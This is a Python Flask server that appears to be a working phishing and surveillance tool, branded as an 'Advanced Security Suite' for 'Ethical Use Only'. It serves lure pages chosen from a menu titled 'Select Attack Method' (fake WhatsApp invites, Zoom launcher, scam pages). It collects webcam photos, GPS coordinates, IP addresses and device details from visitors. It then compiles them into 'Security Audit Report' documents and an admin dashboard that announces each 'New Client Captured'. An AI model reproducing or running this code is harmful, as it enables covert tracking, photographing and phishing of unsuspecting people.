# Copyright (c) 2025 Jutt Cyber Tech. All rights reserved.
# "Original work by Jutt Cyber Tech"

import os
from flask import Flask, render_template, request, session, redirect, url_for, abort, send_from_directory, jsonify
from datetime import datetime, timedelta
import base64
import logging
import subprocess
import platform
from threading import Lock
import socket
import ipaddress
from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.shared import Inches, RGBColor
import requests
import shutil
import smtplib
from email.mime.text import MIMEText
from dotenv import load_dotenv
import time
import json
import hashlib
import secrets
from functools import wraps
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import random

# Load environment variables
load_dotenv()

# ANSI color codes for terminal
R = "\033[1;91m"  # Bright Red
G = "\033[1;92m"  # Bright Green
C = "\033[1;96m"  # Bright Cyan
W = "\033[1;97m"  # Bright White
B = "\033[1;95m"  # Bright Magenta
Y = "\033[1;93m"  # Bright Yellow
M = "\033[1;94m"  # Bright Blue
P = "\033[1;95m"  # Bright Purple
RESET = "\033[0m"

# Clear terminal
subprocess.call("cls" if platform.system() == "Windows" else "clear", shell=True)

# Enhanced Colorful Banner with gradient effect
banner = f"""
{R}╔═══════════════════════════════════════════════════════════╗
{R}║  {G}██████╗ ███████╗██╗   ██╗████████╗     ████████╗███████╗{R}║
{R}║  {G}██╔══██╗██╔════╝╚██╗ ██╔╝╚══██╔══╝     ╚══██╔══╝██╔════╝{R}║
{R}║  {Y}██████╔╝█████╗   ╚████╔╝    ██║           ██║   █████╗  {R}║
{R}║  {Y}██╔═══╝ ██╔══╝    ╚██╔╝     ██║           ██║   ██╔══╝  {R}║
{R}║  {C}██║     ███████╗   ██║      ██║           ██║   ███████╗{R}║
{R}║  {C}╚═╝     ╚══════╝   ╚═╝      ╚═╝           ╚═╝   ╚══════╝{R}║
{R}╠═══════════════════════════════════════════════════════════╣
{R}║ {G}Creator      : {C}Jutt Cyber Tech                          {R}║
{R}║ {G}Email        : {C}js434@proton.me                           {R}║
{R}║ {G}Version      : {C}2.0.0                                    {R}║
{R}║ {G}Status       : {Y}⚡ Advanced Security Suite                {R}║
{R}╠═══════════════════════════════════════════════════════════╣
{R}║ {Y}⚠️  Ethical Use Only | Educational Purpose  ⚠️            {R}║
{R}╚═══════════════════════════════════════════════════════════╝{RESET}
"""
print(banner)

# Suppress Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.secret_key = os.urandom(48)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=2)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

print_lock = Lock()
executor = ThreadPoolExecutor(max_workers=4)

# Enhanced security variables
failed_attempts = 0
lockout_time = None
login_attempts = {}
rate_limiter = {}

# Rate limiting decorator
def rate_limit(limit=5, window=60):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            now = time.time()
            if ip not in rate_limiter:
                rate_limiter[ip] = []
            rate_limiter[ip] = [t for t in rate_limiter[ip] if now - t < window]
            if len(rate_limiter[ip]) >= limit:
                return jsonify({'error': 'Rate limit exceeded'}), 429
            rate_limiter[ip].append(now)
            return f(*args, **kwargs)
        return wrapped
    return decorator

# Async geolocation fetch
async def fetch_geo_async(session, ip_str, token):
    url = f"https://ipinfo.io/{ip_str}"
    try:
        async with session.get(url, params={"token": token}, timeout=aiohttp.ClientTimeout(total=8)) as response:
            j = await response.json()
            lat, lon = None, None
            if 'loc' in j and ',' in j['loc']:
                try:
                    lat, lon = map(float, j['loc'].split(','))
                except ValueError:
                    pass
            return {
                "continent": j.get("continent", "Unknown"),
                "country": j.get("country", "Unknown"),
                "region": j.get("region", "Unknown"),
                "city": j.get("city", "Unknown"),
                "org": j.get("org", "Unknown"),
                "isp": j.get("org", "Unknown"),
                "ip_latitude": lat,
                "ip_longitude": lon,
                "timezone": j.get("timezone", "Unknown"),
                "postal": j.get("postal", "Unknown")
            }
    except Exception:
        return {}

# Async reverse geocoding
async def reverse_geocode_async(session, lat, lon):
    if not lat or not lon:
        return None, None
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
        headers = {'User-Agent': 'SecurityAuditTool/2.0'}
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as response:
            data = await response.json()
            address = data.get('address', {})
            city = address.get('city') or address.get('town') or address.get('village')
            country = address.get('country')
            return city, country
    except Exception:
        return None, None

# Personalized link management
class PersonalizedLinkManager:
    def __init__(self):
        self.links = {}
        self.cleanup_interval = 3600  # 1 hour
        self.last_cleanup = time.time()
    
    def create_link(self, template, data):
        link_id = secrets.token_urlsafe(16)
        self.links[link_id] = {
            'template': template,
            'data': data,
            'created': time.time(),
            'expires': time.time() + 86400  # 24 hours
        }
        self._cleanup()
        return link_id
    
    def get_link(self, link_id):
        self._cleanup()
        link = self.links.get(link_id)
        if link and link['expires'] > time.time():
            return link
        return None
    
    def _cleanup(self):
        now = time.time()
        if now - self.last_cleanup > self.cleanup_interval:
            self.links = {k: v for k, v in self.links.items() if v['expires'] > now}
            self.last_cleanup = now

link_manager = PersonalizedLinkManager()

# Enhanced template structure
TEMPLATES = {
    "Attack_files": {
        "1": {"name": "🎭 Friendship Forever", "template": "friendship/friendship.html", "personalizable": True, "icon": "💝"},
        "2": {"name": "🎥 Zoom Meeting Launcher", "template": "zoom/zoom.html", "personalizable": False, "icon": "📹"},
        "3": {"name": "⚠️ Business Scam Advisory", "template": "business_scam/business_scam.html", "personalizable": True, "icon": "🏢"},
        "4": {"name": "💬 WhatsApp Group Invite", "template": "whatsapp_invite/Whats_app.html", "personalizable": True, "icon": "📱"},
        "5": {"name": "🔄 URL Redirector", "template": "redirect/redirect.html", "personalizable": True, "icon": "🔗"}
    }
}

def select_template():
    while True:
        print(f"\n{P}{B}╔══════════════════════════════════╗{RESET}")
        print(f"{P}{B}║    Select Attack Method 😈       ║{RESET}")
        print(f"{P}{B}╚══════════════════════════════════╝{RESET}\n")
        
        for key, item_data in TEMPLATES["Attack_files"].items():
            print(f"{G}  [{key}] {C}{item_data['icon']} {item_data['name']}{RESET}")
        
        print(f"\n{Y}└─> {RESET}", end="")
        template_choice = input().strip()
        selected_option_data = TEMPLATES["Attack_files"].get(template_choice)
        
        if not selected_option_data:
            print(f"\n{R}✗ Invalid selection. Please try again.{RESET}")
            time.sleep(1)
            continue
        
        selected_template = selected_option_data['template']
        display_name = selected_option_data['name']
        
        print(f"\n{G}✓ Selected: {C}{display_name}{RESET}\n")
        
        global is_personalized_session, personalized_data
        is_personalized_session, personalized_data = False, {}
        
        if selected_option_data.get("personalizable"):
            print(f"{Y}✨ This template supports personalization!{RESET}\n")
            
            if selected_template == "redirect/redirect.html":
                while True:
                    redirect_url = input(f"{Y}Enter redirect URL (include http:// or https://): {RESET}").strip()
                    if redirect_url.startswith(('http://', 'https://')):
                        is_personalized_session = True
                        personalized_data = {'redirect_url': redirect_url, 'template': selected_template}
                        print(f"{G}✓ Redirect URL set to: {C}{redirect_url}{RESET}")
                        return "Attack_files", selected_template
                    else:
                        print(f"{R}✗ Invalid URL format. Include http:// or https://{RESET}")
            
            elif selected_template == "whatsapp_invite/Whats_app.html":
                group_name = input(f"{Y}WhatsApp Group Name: {RESET}").strip()
                group_picture_url = input(f"{Y}Group Picture URL (optional): {RESET}").strip()
                is_personalized_session = True
                personalized_data = {
                    'group_name': group_name or "Group Chat",
                    'group_picture_url': group_picture_url,
                    'template': selected_template
                }
                print(f"{G}✓ Personalized group: {C}{group_name or 'Group Chat'}{RESET}")
                return "Attack_files", selected_template
            
            elif selected_template == "business_scam/business_scam.html":
                company_name = input(f"{Y}Company/Broker Name: {RESET}").strip()
                if company_name:
                    is_personalized_session = True
                    personalized_data = {'name': company_name, 'template': selected_template}
                    print(f"{G}✓ Company set to: {C}{company_name}{RESET}")
                    return "Attack_files", selected_template
            
            elif selected_template == "friendship/friendship.html":
                friend_name = input(f"{Y}Friend's Name: {RESET}").strip()
                if friend_name:
                    is_personalized_session = True
                    personalized_data = {'name': friend_name, 'template': selected_template}
                    print(f"{G}✓ Personalized for: {C}{friend_name}{RESET}")
                    return "Attack_files", selected_template
        
        return "Attack_files", selected_template

# Create necessary folders
folders = ['templates/Attack_files', 'static/css', 'static/js', 'static/img', 'data', 'templates/admin', 'logs']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

category, selected_template = select_template()

# Enhanced routes with caching and security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

@app.route('/')
@rate_limit(limit=100)
def index():
    global is_personalized_session, personalized_data
    if is_personalized_session and personalized_data:
        template_name = personalized_data.pop('template')
        render_data = personalized_data.copy()
        is_personalized_session, personalized_data = False, {}
        return render_template(f"{category}/{template_name}", **render_data)
    return render_template(f"{category}/{selected_template}")

@app.route('/p/<link_id>')
def personalized_link(link_id):
    link = link_manager.get_link(link_id)
    if not link:
        return "Link expired or invalid", 404
    return render_template(f"{category}/{link['template']}", **link['data'])

@app.route('/api/create_link', methods=['POST'])
@rate_limit(limit=10)
def create_personalized_link():
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.json
    template = data.get('template')
    template_data = data.get('data', {})
    
    if template not in TEMPLATES["Attack_files"].values():
        return jsonify({'error': 'Invalid template'}), 400
    
    link_id = link_manager.create_link(template, template_data)
    return jsonify({
        'link': f"{request.host_url}p/{link_id}",
        'id': link_id,
        'expires': 86400
    })

@app.route('/admin')
def admin_login():
    global lockout_time, failed_attempts
    
    if lockout_time and datetime.now() < lockout_time:
        remaining = (lockout_time - datetime.now()).seconds // 60
        return render_template('admin/login.html', 
                             error=f"🔒 Account locked. Try again in {remaining} minutes.",
                             lockout=True)
    
    return render_template('admin/login.html')

@app.context_processor
def inject_now():
    return {'now': datetime.utcnow, 'version': '2.0.0'}

@app.template_filter('format_time')
def format_time_filter(dt, format='%B %d, %Y %H:%M'):
    if isinstance(dt, str):
        return dt
    return dt.strftime(format)

@app.route('/admin/login', methods=['POST'])
@rate_limit(limit=5)
def admin_auth():
    global failed_attempts, lockout_time
    
    if lockout_time and datetime.now() < lockout_time:
        remaining = (lockout_time - datetime.now()).seconds // 60
        return render_template('admin/login.html', 
                             error=f"🔒 Account locked. Try again in {remaining} minutes.",
                             lockout=True)
    
    username = request.form.get('username')
    password = request.form.get('password')
    csrf_token = request.form.get('csrf_token')
    
    # Verify CSRF token
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return render_template('admin/login.html', error="Invalid request")
    
    if username == os.getenv("ADMIN_USERNAME") and password == os.getenv("ADMIN_PASSWORD"):
        session['admin'] = True
        session.permanent = True
        failed_attempts = 0
        lockout_time = None
        
        # Log successful login
        with open('logs/admin_access.log', 'a') as f:
            f.write(f"{datetime.now()} - Admin login from {request.remote_addr}\n")
        
        return redirect(url_for('admin_dashboard'))
    else:
        failed_attempts += 1
        ip = request.remote_addr
        login_attempts[ip] = login_attempts.get(ip, 0) + 1
        
        if failed_attempts >= 4:
            lockout_time = datetime.now() + timedelta(minutes=10)
            send_lockout_email()
            return render_template('admin/login.html', 
                                 error="🚫 Too many failed attempts. Account locked for 10 minutes.",
                                 lockout=True)
        
        remaining = 4 - failed_attempts
        return render_template('admin/login.html', 
                             error=f"❌ Invalid credentials. {remaining} attempts remaining.")

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    # Generate CSRF token
    session['csrf_token'] = secrets.token_urlsafe(32)
    return render_template('admin/dashboard.html', admin=True, csrf_token=session['csrf_token'])

@app.route('/api/dashboard_data')
def get_dashboard_data():
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    clients = []
    data_dir = 'data'
    
    if os.path.exists(data_dir):
        for client_folder in os.listdir(data_dir):
            client_path = os.path.join(data_dir, client_folder)
            summary_path = os.path.join(client_path, 'summary.json')
            
            if os.path.isdir(client_path) and os.path.exists(summary_path):
                try:
                    with open(summary_path, 'r') as f:
                        client_info = json.load(f)
                        client_info['id'] = client_folder
                        
                        # Count photos
                        client_info['photo_count'] = len([p for p in os.listdir(client_path) 
                                                         if p.startswith('photo_') and p.endswith('.png')])
                        
                        # Get latest activity
                        docx_files = [f for f in os.listdir(client_path) if f.endswith('.docx')]
                        if docx_files:
                            latest_doc = max(docx_files, key=lambda f: os.path.getmtime(os.path.join(client_path, f)))
                            client_info['last_activity'] = datetime.fromtimestamp(
                                os.path.getmtime(os.path.join(client_path, latest_doc))
                            ).strftime('%Y-%m-%d %H:%M:%S')
                        
                        clients.append(client_info)
                except Exception:
                    pass
    
    sorted_clients = sorted(clients, key=lambda c: c.get('date', ''), reverse=True)
    
    # Enhanced statistics
    stats = {
        'total_clients': len(clients),
        'total_photos': sum(c.get('photo_count', 0) for c in clients),
        'active_today': len([c for c in clients if c.get('date', '').startswith(datetime.now().strftime('%Y-%m-%d'))]),
        'unique_countries': len({c.get('country') for c in clients if c.get('country') != 'Unknown'})
    }
    
    # Analytics with time series
    daily_stats = {}
    for client in clients:
        date = client.get('date', '').split()[0]
        if date:
            daily_stats[date] = daily_stats.get(date, 0) + 1
    
    time_series = [{'date': d, 'count': c} for d, c in sorted(daily_stats.items())[-30:]]
    
    return jsonify({
        'clients': sorted_clients,
        'stats': stats,
        'time_series': time_series,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/save_photo', methods=['POST'])
def save_photo():
    req_data = request.get_json()
    if not req_data or "image" not in req_data or "clientId" not in req_data:
        return jsonify({'error': 'Invalid data'}), 400
    
    client_id = req_data["clientId"]
    image_data = req_data["image"]
    
    try:
        _, encoded = image_data.split(",", 1)
        binary = base64.b64decode(encoded)
        
        client_folder = os.path.join("data", client_id)
        os.makedirs(client_folder, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        filename = os.path.join(client_folder, f"photo_{timestamp}.png")
        
        with open(filename, "wb") as f:
            f.write(binary)
        
        # Compress image if too large
        if os.path.getsize(filename) > 5 * 1024 * 1024:  # 5MB
            try:
                from PIL import Image
                img = Image.open(filename)
                img.save(filename, optimize=True, quality=85)
            except ImportError:
                pass  # PIL not installed, skip compression
        
        print(f"{G}[+] Photo captured: {C}{client_id}{RESET}")
        return jsonify({'status': 'success', 'filename': os.path.basename(filename)})
    
    except Exception as e:
        print(f"{R}[!] Error saving photo: {e}{RESET}")
        return jsonify({'error': 'Failed to save photo'}), 500

@app.route('/save_location', methods=["POST"])
def save_location():
    req_data = request.get_json()
    if not req_data or "clientId" not in req_data:
        return jsonify({'error': 'Invalid data'}), 400
    
    client_id = req_data["clientId"]
    lat = req_data.get("latitude")
    lon = req_data.get("longitude")

    client_folder = os.path.join("data", client_id)
    os.makedirs(client_folder, exist_ok=True)
    with open(os.path.join(client_folder, 'location.tmp'), 'w') as f:
        json.dump({'latitude': lat, 'longitude': lon}, f)

    return jsonify({'status': 'success'})

@app.route('/save_client_info', methods=['POST'])
def save_client_info():
    import asyncio
    
    info = request.json if request.is_json else {}
    client_id = info.pop("clientId", f"client_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}")
    
    # Get IP and geolocation
    client_ip = get_client_ip()
    ip4, ip6 = split_ip_versions(client_ip)
    geo_ip_to_use = ip4 or ip6
    
    # Run async tasks in sync context
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def fetch_data():
        async with aiohttp.ClientSession() as session:
            token = os.getenv("IPINFO_TOKEN")
            geo_task = fetch_geo_async(session, geo_ip_to_use, token) if geo_ip_to_use else asyncio.sleep(0)
            
            client_folder = os.path.join("data", client_id)
            os.makedirs(client_folder, exist_ok=True)
            
            location_file = os.path.join(client_folder, 'location.tmp')
            gps_lat, gps_lon = None, None
            
            if os.path.exists(location_file):
                with open(location_file, 'r') as f:
                    loc_data = json.load(f)
                    gps_lat = loc_data.get('latitude')
                    gps_lon = loc_data.get('longitude')
                os.remove(location_file)
            
            rev_geo_task = reverse_geocode_async(session, gps_lat, gps_lon) if gps_lat and gps_lon else asyncio.sleep(0)
            
            geo = await geo_task if geo_ip_to_use else {}
            gps_city, gps_country = await rev_geo_task if gps_lat and gps_lon else (None, None)
            
            return geo, gps_city, gps_country, gps_lat, gps_lon
    
    try:
        geo, gps_city, gps_country, gps_lat, gps_lon = loop.run_until_complete(fetch_data())
    finally:
        loop.close()
    
    # Create Word document with enhanced formatting
    doc = Document()
    
    # Title with styling
    title = doc.add_heading(f"Security Audit Report", 0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    title_run = title.runs[0]
    title_run.font.color.rgb = RGBColor(46, 134, 193)
    title_run.font.size = Inches(0.5)
    
    # Client info section
    doc.add_heading(f"Client ID: {client_id}", level=1)
    doc.add_paragraph(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    doc.add_paragraph(f"Report ID: {hashlib.sha256(client_id.encode()).hexdigest()[:16]}")
    
    # Device Information
    device_heading = doc.add_heading("Device Information", level=1)
    device_heading.runs[0].font.color.rgb = RGBColor(52, 152, 219)
    
    device_info = [
        ("Platform", info.get('platform', 'Unknown')),
        ("OS Version", info.get('osVersion', 'Unknown')),
        ("CPU Cores", info.get('cpuCores', 'Unknown')),
        ("RAM", info.get('ram', 'Unknown')),
        ("GPU", info.get('gpu', 'Unknown')),
        ("Screen Resolution", f"{info.get('screenWidth', 'Unknown')}x{info.get('screenHeight', 'Unknown')}"),
        ("Battery", f"{info.get('battery', 'Unknown')}%"),
        ("User Agent", info.get('userAgent', 'Unknown'))
    ]
    
    for key, value in device_info:
        p = doc.add_paragraph(style='List Bullet')
        p.add_run(f"{key}: ").bold = True
        p.add_run(str(value))
    
    # Network Information
    network_heading = doc.add_heading("Network Information", level=1)
    network_heading.runs[0].font.color.rgb = RGBColor(46, 204, 113)
    
    network_info = [
        ("IPv4", ip4 or 'Unknown'),
        ("IPv6", ip6 or 'Unknown'),
        ("Continent", geo.get('continent', 'Unknown')),
        ("Country", gps_country or geo.get('country', 'Unknown')),
        ("Region", geo.get('region', 'Unknown')),
        ("City", gps_city or geo.get('city', 'Unknown')),
        ("ISP", geo.get('isp', 'Unknown')),
        ("Timezone", geo.get('timezone', 'Unknown'))
    ]
    
    for key, value in network_info:
        p = doc.add_paragraph(style='List Bullet')
        p.add_run(f"{key}: ").bold = True
        p.add_run(str(value))
    
    # Location section
    if gps_lat and gps_lon:
        loc_heading = doc.add_heading("GPS Location", level=1)
        loc_heading.runs[0].font.color.rgb = RGBColor(155, 89, 182)
        
        p = doc.add_paragraph(style='List Bullet')
        p.add_run("Coordinates: ").bold = True
        p.add_run(f"{gps_lat}, {gps_lon}")
        
        maps_url = f"https://www.google.com/maps?q={gps_lat},{gps_lon}"
        p = doc.add_paragraph(style='List Bullet')
        p.add_run("Google Maps: ").bold = True
        p.add_run(maps_url)
    
    # Photos section
    client_folder = os.path.join("data", client_id)
    photos = sorted([f for f in os.listdir(client_folder) if f.endswith('.png') and f.startswith('photo_')])
    
    if photos:
        photos_heading = doc.add_heading("Captured Photos", level=1)
        photos_heading.runs[0].font.color.rgb = RGBColor(231, 76, 60)
        
        for photo in photos:
            doc.add_paragraph(photo, style='List Bullet')
            try:
                doc.add_picture(os.path.join(client_folder, photo), width=Inches(4))
            except Exception as e:
                doc.add_paragraph(f"[Error loading image: {e}]")
    
    # Security Notice
    notice_heading = doc.add_heading("Security Notice", level=1)
    notice_heading.runs[0].font.color.rgb = RGBColor(241, 196, 15)
    
    doc.add_paragraph("This report was generated as part of a security audit.")
    doc.add_paragraph("All data should be handled in accordance with applicable privacy laws.")
    doc.add_paragraph("Authorized use only.")
    
    # Save document
    doc_path = os.path.join(client_folder, f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.docx")
    doc.save(doc_path)
    
    # Save summary
    summary_data = {
        "date": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "os": info.get('osVersion', 'Unknown'),
        "country": gps_country or geo.get('country', 'Unknown'),
        "city": gps_city or geo.get('city', 'Unknown'),
        "ip": ip4 or ip6 or 'Unknown',
        "isp": geo.get('isp', 'Unknown'),
        "gps_latitude": gps_lat,
        "gps_longitude": gps_lon,
        "ip_latitude": geo.get('ip_latitude'),
        "ip_longitude": geo.get('ip_longitude'),
        "browser": info.get('userAgent', 'Unknown')[:100],
        "platform": info.get('platform', 'Unknown')
    }
    
    summary_path = os.path.join(client_folder, "summary.json")
    with open(summary_path, 'w') as f:
        json.dump(summary_data, f, indent=2)
    
    # Terminal output with emojis and colors
    with print_lock:
        print("\n" + "=" * 50)
        print(f"{B}🎯 New Client Captured!{RESET}")
        print("=" * 50)
        print(f"{G}📱 Device    : {C}{info.get('platform', 'Unknown')} / {info.get('osVersion', 'Unknown')}{RESET}")
        print(f"{G}🌍 Location  : {C}{gps_city or geo.get('city', 'Unknown')}, {gps_country or geo.get('country', 'Unknown')}{RESET}")
        print(f"{G}🔌 IP Address: {C}{ip4 or ip6 or 'Unknown'}{RESET}")
        print(f"{G}📸 Photos    : {C}{len(photos)}{RESET}")
        print(f"{G}📄 Report    : {C}{os.path.basename(doc_path)}{RESET}")
        print("=" * 50 + "\n")
    
    return jsonify({'status': 'success', 'client_id': client_id})

def get_client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        first = xff.split(",")[0].strip()
        if first:
            return first
    return request.remote_addr or ""

def split_ip_versions(ip_str):
    ip4, ip6 = "", ""
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        if ip_obj.version == 4:
            ip4 = ip_str
        elif ip_obj.version == 6:
            ip6 = ip_str
    except Exception:
        pass
    return ip4, ip6

def send_lockout_email():
    try:
        sender_email = os.getenv("ADMIN_EMAIL")
        receiver_email = os.getenv("ADMIN_EMAIL")
        password = os.getenv("EMAIL_PASSWORD")
        
        if not all([sender_email, receiver_email, password]):
            return False
        
        msg = MIMEText(f"""
        Security Alert - Admin Account Lockout
        
        Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        IP: {request.remote_addr if request else 'Unknown'}
        
        Multiple failed login attempts detected. The admin account has been locked for 10 minutes.
        
        Please check your system security.
        """)
        
        msg['Subject'] = '[SECURITY] Admin Account Lockout Notification'
        msg['From'] = sender_email
        msg['To'] = receiver_email
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.send_message(msg)
        
        return True
    except Exception:
        return False

# Additional admin routes
@app.route('/admin/clients')
def admin_clients():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin/clients.html', admin=True)

@app.route('/admin/analytics')
def admin_analytics():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin/analytics.html', admin=True)

@app.route('/admin/settings')
def admin_settings():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin/settings.html', admin=True)

@app.route('/admin/export_data')
def export_data():
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data_dir = 'data'
    if not os.path.exists(data_dir) or not os.listdir(data_dir):
        return jsonify({'error': 'No data to export'}), 404
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f'audit_data_{timestamp}'
    archive_path = shutil.make_archive(archive_name, 'zip', data_dir)
    
    return send_from_directory(os.getcwd(), f"{archive_name}.zip", as_attachment=True)

@app.route('/admin/delete_all_data', methods=['POST'])
def delete_all_data():
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    csrf_token = request.form.get('csrf_token')
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({'error': 'Invalid CSRF token'}), 400
    
    shutil.rmtree('data', ignore_errors=True)
    os.makedirs('data', exist_ok=True)
    
    # Log deletion
    with open('logs/admin_actions.log', 'a') as f:
        f.write(f"{datetime.now()} - Admin deleted all data from {request.remote_addr}\n")
    
    return jsonify({'status': 'success'})

@app.route('/admin/delete/<client_id>', methods=['POST'])
def admin_delete_client(client_id):
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    client_path = os.path.join('data', client_id)
    if os.path.exists(client_path):
        shutil.rmtree(client_path)
        
        with open('logs/admin_actions.log', 'a') as f:
            f.write(f"{datetime.now()} - Admin deleted client {client_id} from {request.remote_addr}\n")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'error': 'Client not found'}), 404

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/.env')
def block_env():
    abort(404)

# Route to serve captured images
@app.route('/data/<client_id>/<filename>')
def serve_image(client_id, filename):
    if not session.get('admin'):
        abort(403)
    return send_from_directory(os.path.join('data', client_id), filename)

if __name__ == "__main__":
    host_ip = "0.0.0.0"
    port = 5050
    
    local_ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    
    print(f"\n{G}╔══════════════════════════════════════════════════╗{RESET}")
    print(f"{G}║  🚀 Server Started Successfully!                ║{RESET}")
    print(f"{G}╠══════════════════════════════════════════════════╣{RESET}")
    print(f"{G}║  {C}Local Access    : {W}http://127.0.0.1:{port}{G}          ║{RESET}")
    print(f"{G}║  {C}Network Access  : {W}http://{local_ip}:{port}{G}          ║{RESET}")
    print(f"{G}║  {C}Admin Panel     : {W}http://{local_ip}:{port}/admin{G}     ║{RESET}")
    print(f"{G}╚══════════════════════════════════════════════════╝{RESET}\n")
    
    app.run(host=host_ip, port=port, debug=False, threaded=True)